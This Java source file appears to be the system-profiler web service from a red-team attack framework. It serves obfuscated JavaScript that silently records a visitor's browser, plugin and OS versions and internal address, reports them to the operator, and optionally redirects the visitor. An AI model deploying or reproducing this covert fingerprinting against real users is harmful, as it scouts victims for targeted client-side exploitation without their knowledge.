package profiler;

import cloudstrike.Response;
import cloudstrike.WebServer;
import cloudstrike.WebService;
import eu.bitwalker.useragentutils.UserAgent;

import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SystemProfiler implements WebService {
    protected List listeners = new LinkedList();
    protected String my_html = "";
    protected String my_js = "";
    protected String desc;

    public void addProfileListener(ProfileListener l) {
        this.listeners.add(l);
    }

    public void init(boolean redirect, String url, String allowjava) {
        try {
            StringBuilder javascript = new StringBuilder(1000);
            SystemProfiler.suckItDown("/resources/jquery-1.7.1.min.js", javascript);
            SystemProfiler.suckItDown("/resources/deployJava.js", javascript);
            SystemProfiler.suckItDown("/resources/reader.js", javascript);
            StringBuilder html = new StringBuilder(1000);
            if (redirect) {
                SystemProfiler.suckItDown("/resources/redirect.js", javascript);
                SystemProfiler.suckItDown("/resources/index.html", html);
            } else {
                SystemProfiler.suckItDown("/resources/stay.js", javascript);
                SystemProfiler.suckItDown("/resources/index2.html", html);
            }
            this.my_js = javascript.toString().replace("%URL%", url).replace("%JAVA%", allowjava);
            this.my_html = html.toString().replace("%URL%", url).replace("%JAVA%", allowjava);
            this.my_js = new Obfuscator(this.my_js).obfuscate();
        } catch (Exception ex) {
            WebServer.logException("init system profiler", ex, false);
        }
    }

    public static void suckItDown(String resource, StringBuilder append) throws Exception {
        InputStreamReader i = new InputStreamReader(SystemProfiler.class.getResourceAsStream(resource), StandardCharsets.UTF_8);
        while (i.ready()) {
            append.append((char) i.read());
        }
    }

    protected Map parseResults(String useragent, String data) {
        HashMap<String, String> temp = new HashMap<>();
        String[] apps = data.split("\n");
        for (String app : apps) {
            String[] parse = app.split("\t");
            if (parse[0].length() == 0) continue;
            if (parse.length == 1) {
                temp.put(parse[0], "");
                continue;
            }
            temp.put(parse[0], parse[1].replaceAll("\\s+r(\\d+)", ".$1.0"));
        }
        boolean is64bitOS = false;
        boolean is64bitBrowser = false;
        if (useragent.contains("WOW64")) {
            is64bitOS = true;
            is64bitBrowser = false;
        } else if (useragent.contains("Win64")) {
            is64bitOS = true;
            is64bitBrowser = true;
        }
        UserAgent agent = new UserAgent(useragent);
        String[] bname = agent.getBrowser().getName().split(" ");
        String key = "";
        if (bname.length <= 2) {
            key = bname[0];
        } else if (bname.length == 3) {
            key = bname[0] + " " + bname[1];
        } else if (bname.length == 4) {
            key = bname[0] + " " + bname[1] + " " + bname[2];
        }
        if (!temp.containsKey(key) && agent.getBrowserVersion() != null) {
            if (is64bitBrowser) {
                temp.put(key + " *64", agent.getBrowserVersion().getVersion());
            } else {
                temp.put(key, agent.getBrowserVersion().getVersion());
            }
        } else if (is64bitBrowser) {
            String ver = temp.get(key) + "";
            temp.remove(key);
            temp.put(key + " *64", ver);
        }
        String os = agent.getOperatingSystem().getName();
        if (useragent.contains("Windows NT 6.2")) {
            os = "Windows 8";
        } else if (useragent.contains("Windows NT 10.0")) {
            os = "Windows 10";
        }
        if (is64bitOS) {
            temp.put(os + " *64", "");
        } else {
            temp.put(os, "");
        }
        Pattern[] version = new Pattern[]{Pattern.compile("Mac OS X (\\d+_\\d+_\\d+)"), Pattern.compile("Mac OS X (.*?)\\;")};
        Arrays.stream(version).map(aVersion -> aVersion.matcher(useragent)).filter(Matcher::find).findFirst().ifPresent(m -> temp.put(agent.getOperatingSystem().getName(), m.group(1).replace("_", ".")));
        return temp;
    }

    @Override
    public void setup(WebServer server, String uri) {
        server.registerSecondary("/compatible", this);
        server.registerSecondary("/java/iecheck.class", this);
        server.registerSecondary("/check.js", this);
        server.registerSecondary("/compatible", this);
        server.register(uri, this);
    }

    @Override
    public Response serve(String uri, String method, Properties header, Properties param) {
        if (uri.equals("/compatible")) {
            Iterator i = this.listeners.iterator();
            String who = header.get("REMOTE_ADDRESS") + "";
            if (who.length() > 1) {
                who = who.substring(1);
            }
            Map results = this.parseResults(header.get("User-Agent") + "", param.get("data") + "");
            while (i.hasNext()) {
                ProfileListener l = (ProfileListener) i.next();
                l.receivedProfile(who, param.get("from") + "", header.get("User-Agent") + "", results, param.get("id") + "");
            }
            return new Response("200 OK", "text/plain", "");
        }
        if (uri.equals("/java/iecheck.class")) {
            return new Response("200 OK", "application/octet-stream", this.getClass().getClassLoader().getResourceAsStream("resources/java/iecheck.class"));
        }
        if (uri.equals("/check.js")) {
            return new Response("200 OK", "text/javascript", this.my_js);
        }
        return new Response("200 OK", "text/html", this.my_html);
    }

    public SystemProfiler() {
    }

    public SystemProfiler(String desc, String allowjava) {
        this.init(false, "", allowjava);
        this.desc = desc;
    }

    public SystemProfiler(String url, String desc, String allowjava) {
        this.init(true, url, allowjava);
        this.desc = desc;
    }

    public static void main(String[] args) {
        try {
            WebServer server = new WebServer(81);
            SystemProfiler temp = new SystemProfiler("", "true");
            temp.setup(server, "/");
            temp.addProfileListener((external, internal, useragent, results, cookie) -> {
                System.err.println("Received a profile: (" + external + "/" + internal + ")");
                for (Object o : results.entrySet()) {
                    Map.Entry app = (Map.Entry) o;
                    System.err.println("     " + app.getKey() + " " + app.getValue());
                }
            });
            do {
                Thread.sleep(60000L);
            } while (true);
        } catch (Exception ex) {
            ex.printStackTrace();
            return;
        }
    }

    public String toString() {
        return this.desc;
    }

    @Override
    public String getType() {
        return "profiler";
    }

    @Override
    public List cleanupJobs() {
        return new LinkedList();
    }

    @Override
    public boolean suppressEvent(String uri) {
        return "/compatible".equals(uri);
    }

    @Override
    public boolean isFuzzy() {
        return false;
    }

    public interface ProfileListener {
        void receivedProfile(String var1, String var2, String var3, Map var4, String var5);
    }

}

